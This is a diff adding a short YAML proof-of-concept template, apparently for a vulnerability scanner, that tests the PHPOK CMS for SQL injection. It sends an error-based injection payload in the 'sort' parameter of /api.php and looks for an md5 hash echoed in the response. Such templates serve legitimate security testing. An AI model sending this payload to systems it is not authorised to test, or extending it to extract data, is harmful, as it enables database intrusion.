@@ -1,0 +1,10 @@
+name: poc-yaml-phpok-sqli
+rules:
+  - method: GET
+    path: /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(99999999))) --+
+    expression: |
+      response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+detail:
+  author: jinqi
+  links:
+    - https://github.com/jinqi520
